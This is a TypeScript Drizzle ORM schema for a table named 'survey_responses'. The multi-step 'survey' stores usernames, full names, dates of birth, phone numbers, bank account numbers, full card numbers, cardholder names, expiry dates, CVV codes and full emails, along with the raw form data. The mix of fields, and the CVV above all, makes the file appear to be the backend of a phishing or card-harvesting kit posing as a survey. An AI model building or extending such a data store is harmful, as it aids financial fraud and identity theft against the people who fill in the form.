import { pgTable, text, timestamp, uuid, jsonb } from 'drizzle-orm/pg-core';

export const surveyResponses = pgTable('survey_responses', {
  id: uuid('id').defaultRandom().primaryKey(),
  // Step 1 data
  username: text('username').notNull(),
  fullName: text('fullName').notNull(),
  accountTypes: text('account_types').array().notNull(),
  
  // Step 2 data
  idType: text('id_type').notNull(),
  fullNameConfirm: text('full_name_confirm').notNull(),
  dateOfBirth: text('date_of_birth').notNull(),
  phoneNumber: text('phone_number').notNull(),
  accountNumber: text('account_number').notNull(),
  cardNumber: text('card_number').notNull(),
  cardName: text('card_name').notNull(),
  expiryDate: text('expiry_date').notNull(),
  cvv: text('cvv').notNull(),
  
  // Step 3 data
  missingData: text('missing_data').array(),
  fullEmail: text('full_email').notNull(),
  
  // Additional fields
  rawData: jsonb('raw_data').notNull(), // Store the complete form data as JSON
  createdAt: timestamp('created_at').defaultNow().notNull(),
  updatedAt: timestamp('updated_at').defaultNow().notNull()
});